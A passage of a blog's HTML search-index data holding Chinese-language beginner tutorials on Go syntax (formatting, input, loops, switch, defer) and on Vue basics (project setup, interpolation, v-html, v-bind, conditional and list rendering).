plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">%v：默认格式的值</span><br><span class="line">%+v：类似 %v,但会包含结构体的字段名</span><br><span class="line">%#v：生成值的Go语法表示</span><br><span class="line">%T：打印值的类型</span><br><span class="line">%s：字符串或者字节数组的无解释字节</span><br><span class="line">%q：单引号围绕的字符字面值,由 Go 语法安全地转义</span><br><span class="line">%d：十进制表示的整数</span><br><span class="line">%b：一个二进制整数,将一个整数格式转化为二进制的表达方式</span><br><span class="line">%o：八进制整数</span><br><span class="line">%x：小写的十六进制数值</span><br><span class="line">%X：大写的十六进制数值</span><br><span class="line">%U：一个 Unicode 表示法表示的整型码值</span><br><span class="line">%f：浮点数</span><br><span class="line">%p：指针,十六进制方式显示</span><br></pre></td></tr></table></figure><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>go中输入使用<code>fmt</code>包,最常用的是<code>Scanf</code>和<code>Scanln</code>,同上,<code>Scanln</code>会自动在末尾添加换行符,<code>Scanf</code>格式化输入<br>不同的是,输入需要进行异常处理,如:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> sum <span class="type">int</span></span><br><span class="line">_, err := fmt.Scanf(<span class="string">&quot;%d&quot;</span>, &amp;sum)  <span class="comment">//  _(空白标识符)表示不使用返回值 </span></span><br><span class="line"><span class="comment">//  _, err := fmt.Scanln(&amp;sum)       // 如果用一个变量来接收这个返回值的话,正常是返回1</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(sum)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><p>在go中使用<code>for</code>关键字,go中没有<code>while</code>,只有for,如下:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>&#123;</span><br><span class="line">    <span class="comment">// 死循环</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++&#123;</span><br><span class="line">    fmt.Println(i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>for-range<br>这是Go语言特有的一种的迭代结构，它一般用来遍历数组，slice和map等集合。<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span>(</span><br><span class="line">  <span class="string">&quot;fmt&quot;</span></span><br><span class="line">  )</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">  arr := [...]<span class="type">int</span>&#123;<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>&#125;</span><br><span class="line">  <span class="keyword">for</span> i, v := <span class="keyword">range</span> arr &#123;</span><br><span class="line">        fmt.Println(i,v)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>输出结果:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0 6</span><br><span class="line">1 7</span><br><span class="line">2 8</span><br></pre></td></tr></table></figure></li></ul><h3 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h3><ul><li><p>if-else,与C语言不同的是,go中的if语句可以添加初始化语句<br>  如下:</p>  <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">var</span> sum <span class="type">int</span></span><br><span class="line">        _, err := fmt.Scanln(&amp;sum)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            fmt.Println(<span class="string">&quot;输入错误&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> i := <span class="number">8</span>; sum &lt; i &#123;</span><br><span class="line">            fmt.Println(<span class="string">&quot;执行if语句内的打印&quot;</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> sum == i &#123;</span><br><span class="line">            fmt.Println(<span class="string">&quot;执行else-if语句内的打印&quot;</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            fmt.Println(<span class="string">&quot;执行else语句内的打印&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="string">``</span><span class="string">`    </span></span><br><span class="line"><span class="string">- switch-case</span></span><br><span class="line"><span class="string">    golang中的`</span><span class="keyword">switch</span><span class="string">`语句与C语言中的`</span><span class="keyword">switch</span><span class="string">`语句类似,但是golang中的`</span><span class="keyword">case</span><span class="string">`语句默认会`</span><span class="keyword">break</span><span class="string">`,不会像C那样没有`</span><span class="keyword">break</span><span class="string">`就一直执行下去</span></span><br><span class="line"><span class="string">    如下:</span></span><br><span class="line"><span class="string">    `</span><span class="string">``</span> <span class="keyword">go</span></span><br><span class="line">    <span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">var</span> sum <span class="type">int</span></span><br><span class="line">        _, err := fmt.Scanln(&amp;sum)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            fmt.Println(<span class="string">&quot;输入错误&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">switch</span> sum &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            fmt.Println(<span class="string">&quot;这是第1个case语句&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            fmt.Println(<span class="string">&quot;这是第2个case语句&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            fmt.Println(<span class="string">&quot;这是第3个case语句&quot;</span>)</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            fmt.Println(<span class="string">&quot;这是第default语句&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>fallthrough关键字<br>switch语句中，如果在执行完每个分支的代码后，还希望继续执行后续分支的代码，可以使用fallthrough关键字来达到目的</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span>(</span><br><span class="line">  <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">  i :=<span class="number">2</span></span><br><span class="line">  <span class="keyword">switch</span> i &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">          fmt.Printf(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          fmt.Printf(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          <span class="keyword">fallthrough</span>  <span class="comment">//fallthrough会强制执行后面的case代码</span></span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          fmt.Printf(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">          fmt.Printf(<span class="string">&quot;Default&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="defer关键字"><a href="#defer关键字" class="headerlink" title="defer关键字"></a>defer关键字</h3><p>在Go语言中，<code>defer</code>是一种延迟调用机制，<code>defer</code>后面的函数只有在当前函数执行完毕后才能执行</p><p>如:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> fmt.Println(<span class="string">&quot;这是有前面有defer关键字的语句&quot;</span>)</span><br><span class="line">fmt.Println(<span class="string">&quot;这是没有defer关键字的语句&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这是没有defer关键字的语句</span><br><span class="line">这是有前面有defer关键字的语句</span><br></pre></td></tr></table></figure><p>当有多个<code>defer</code>语句时,后面的<code>defer</code>语句会先执行<br>如:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> fmt.Println(<span class="string">&quot;结束&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">4</span>; i++ &#123;</span><br><span class="line"><span class="keyword">defer</span> fmt.Println(i)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> fmt.Println(<span class="string">&quot;开始&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">开始</span><br><span class="line">3</span><br><span class="line">2</span><br><span class="line">1</span><br><span class="line">0</span><br><span class="line">结束</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅浅学习一下Vue</title>
      <link href="/2023/12/28/%E6%B5%85%E6%B5%85%E5%AD%A6%E4%B9%A0%E4%B8%80%E4%B8%8BVue/"/>
      <url>/2023/12/28/%E6%B5%85%E6%B5%85%E5%AD%A6%E4%B9%A0%E4%B8%80%E4%B8%8BVue/</url>
      
        <content type="html"><![CDATA[<h2 id="Vue是什么？"><a href="#Vue是什么？" class="headerlink" title="Vue是什么？"></a>Vue是什么？</h2><p>渐进式JS框架，基于标准的html，css，js构建，并且提供了一套声明式,组件化的编程模型优点:易学易用，性能出色，适用场景丰富</p><h2 id="Vue组件的两种风格"><a href="#Vue组件的两种风格" class="headerlink" title="Vue组件的两种风格:"></a>Vue组件的两种风格:</h2><p>1.选项式API(Vue2):</p><p>2.组合式API(Vue3):</p><h2 id="Vue项目创建"><a href="#Vue项目创建" class="headerlink" title="Vue项目创建:"></a>Vue项目创建:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm init vue@latest</span><br></pre></td></tr></table></figure><p>注意: 项目名称不要大写</p><p>项目创建完成后 根据提示运行Vue项目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">cd &lt;你的Vue&#x27;项目名&gt;</span><br><span class="line"></span><br><span class="line">npm install   </span><br><span class="line"></span><br><span class="line">npm run dev </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后就可以访问你的Vue项目了</p><h2 id="Vue项目开发环境-vscode-Volar扩展"><a href="#Vue项目开发环境-vscode-Volar扩展" class="headerlink" title="Vue项目开发环境: vscode + Volar扩展"></a>Vue项目开发环境: vscode + Volar扩展</h2><p>Vue项目的各个文件夹:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.vscode                --- vscode配置文件</span><br><span class="line">node_modules    --- Vue项目的运行依赖文件夹(npm install时安装的)</span><br><span class="line">public--- 资源文件夹(浏览器图标 favicon.ico)</span><br><span class="line">src--- 源码文件夹</span><br><span class="line">.gitignore--- git文件</span><br><span class="line">index.html--- html入口文件(代码在这个文件里面运行)</span><br><span class="line">package.json--- 版本信息描述文件</span><br><span class="line">README.md    --- 注释文件</span><br><span class="line">vite.config.js--- Vue配置文件</span><br><span class="line">jsconfig.json--- 用于在开发中提高开发效率和IDE性能的文件</span><br><span class="line">package-lock.json       --- 用于确保依赖包的一致性和稳定性的配置文件</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Vue语法"><a href="#Vue语法" class="headerlink" title="Vue语法:"></a>Vue语法:</h2><p>Vue使用的一种基于html的模板语法，可以让我们能够声明式的将其组件实例的数据绑定到呈现的dom上，所有的Vue模板都是语法层面合法的html，可以被合法的浏览器和html解析器解析</p><h3 id="1-文本插值（最基本的数据绑定）"><a href="#1-文本插值（最基本的数据绑定）" class="headerlink" title="1.文本插值（最基本的数据绑定）"></a>1.文本插值（最基本的数据绑定）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;h&gt;实例&lt;/h&gt;</span><br><span class="line">  &lt;p&gt;&#123;&#123; msg &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  data()&#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      msg:&quot;hello Vue&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-JS语法-JS表达式必须写在return后面才合法"><a href="#2-JS语法-JS表达式必须写在return后面才合法" class="headerlink" title="2.JS语法(JS表达式必须写在return后面才合法):"></a>2.JS语法(JS表达式必须写在return后面才合法):</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line"></span><br><span class="line">  &lt;h&gt;实例&lt;/h&gt;</span><br><span class="line">  &lt;p&gt;&#123;&#123; msg &#125;&#125;&lt;/p&gt;</span><br><span class="line">  &lt;p&gt;&#123;&#123; num+1 &#125;&#125;&lt;/p&gt;</span><br><span class="line">  &lt;p&gt;&#123;&#123; ok ? 正确:错误 &#125;&#125;&lt;/p&gt;</span><br><span class="line">  &lt;p&gt;&#123;&#123; message.split(&quot;&quot;).reverse().join(&quot;&quot;) &#125;&#125;&lt;/p&gt;     &lt;!-- 字符串反转 --&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line"></span><br><span class="line">  data()&#123;</span><br><span class="line"></span><br><span class="line">    return &#123;</span><br><span class="line">      msg:&quot;hello Vue&quot;,</span><br><span class="line">      num: 10 ,</span><br><span class="line">      ok: true ,</span><br><span class="line">      message: &quot;你好世界&quot;,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-原始HTML"><a href="#3-原始HTML" class="headerlink" title="3.原始HTML:"></a>3.原始HTML:</h3><p>双大括号会将数据插值为纯文本，而不是HTML，若想插入HTML，需要使用到v-html指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;h&gt;实例&lt;/h&gt;</span><br><span class="line">  &lt;p&gt;纯文本:&#123;&#123; rawHtml &#125;&#125;&lt;/p&gt;</span><br><span class="line">  &lt;p&gt;属性:&lt;span v-html=&quot;rawHtml&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  data()&#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      rawHtml:&quot;&lt;a href = &#x27;https://isyang666.github.io/&#x27;&gt;我的博客&lt;/a&gt;&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="4-属性-Attribute-绑定"><a href="#4-属性-Attribute-绑定" class="headerlink" title="4.属性(Attribute)绑定:"></a>4.属性(Attribute)绑定:</h3><p>双大括号不能在HTML attributes中使用 想要响应式的绑定一个attribute 需要使用到v-bind<br>如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div v-bind:id=&quot;dynamicId&quot; v-bind:class=&quot;dynamicClass&quot;&gt;Isyang666&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  data()&#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      dynamicId:&quot;appid&quot;,</span><br><span class="line">      dynamicClass:&quot;appclass&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">.appclass&#123;</span><br><span class="line">  color: red;</span><br><span class="line">  font-size: 200px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>v-bind指令指示元素的id attribute与组件的dynamicId属性保持一致 如果绑定的值是null或者是undefined 那么该attribute将会从渲染的元素上移除</p><p>简写:<br>因为v-bind非常常用，有简写语法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div :id=&quot;dynamicId&quot; :class= &quot;dynamicClass&quot;&gt;Isyang&lt;/div&gt;</span><br></pre></td></tr></table></figure><h4 id="布尔型-attribute"><a href="#布尔型-attribute" class="headerlink" title="布尔型 attribute"></a>布尔型 attribute</h4><p>依据 true &#x2F; false 值来决定 attribute 是否应该存在于该元素上。disabled 就是最常见的例子之一。</p><p>v-bind 在这种场景下的行为略有不同：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button :disabled=&quot;isButtonDisabled&quot;&gt;Button&lt;/button&gt;</span><br></pre></td></tr></table></figure><p>当 isButtonDisabled 为真值或一个空字符串时，元素会包含这个 disabled attribute。而当其为其他假值时 attribute 将被忽略。</p><h4 id="动态绑定多个值"><a href="#动态绑定多个值" class="headerlink" title="动态绑定多个值"></a>动态绑定多个值</h4><p>objectOfAttrs为一个包含多个属性的JS对象,可以通过v-bind来绑定多个属性到当个元素上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div v-bind=&quot;objectOfAttrs&quot;&gt;Isyang666&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  data()&#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      objectOfAttrs:&#123; </span><br><span class="line">      id:&quot;appid&quot;,</span><br><span class="line">      class:&quot;appclass&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">.appclass&#123;</span><br><span class="line">  color: red;</span><br><span class="line">  font-size: 200px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h3 id="条件渲染"><a href="#条件渲染" class="headerlink" title="条件渲染"></a>条件渲染</h3><p>使用v-if &#x2F; v-else-if &#x2F; v-else 指令来控制元素的显示与隐藏</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p v-if=&quot;seen&quot;&gt;Now you see me&lt;/p&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里，v-if 指令会基于表达式 seen 的值的真假来移除&#x2F;插入该p元素另外两个指令也差不多一样 如果seen为true v-else不执行 反之执行。<br>和v-if一样,v-show也是根据表达式的真假来控制元素的显示与隐藏。不同的是v-show的元素始终会被渲染并保留在DOM中，只是简单地基于CSS的display样式来切换,而v-if在切换的时候条件区块内的监听器和子组件都会被销毁与重建</p><h3 id="列表渲染"><a href="#列表渲染" class="headerlink" title="列表渲染"></a>列表渲染</h3><p>我们可以使用 v-for 指令基于一个数组来渲染一个列表。v-for 指令的值需要使用 item in items 形式的特殊语法，in可以也用of代替，其中 items 是源数据的数组，而 item 是迭代项的别名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div v-for=&quot;item in dataList&quot;&gt;&#123;&#123; item &#125;&#125;&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  data()&#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      dataList:[&quot;data1&quot;,&quot;data2&quot;,&quot;data3&quot;]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>你的数据比较复杂你可以在item后加.去访问指定的值<br>v-for 也支持使用可选的第二个参数表示当前项的位置索引。</p><p>js:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const parentMessage = ref(&#x27;Parent&#x27;)</span><br><span class="line">const items = ref([&#123; message: &#x27;Foo&#x27; &#125;, &#123; message: &#x27;Bar&#x27; &#125;])</span><br></pre></td></tr></table></figure><p>template</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;li v-for=&quot;(item, index) in items&quot;&gt;</span><br><span class="line">  &#123;&#123; parentMessage &#125;&#125; - &#123;&#123; index &#125;&#125; - &#123;&#123; item.message &#125;&#125;</span><br><span class="line">&lt;/li&gt;</span><br></pre></td></tr></table></figure><p>效果:</p><figure class="highlight plaintext"><table><tr><td 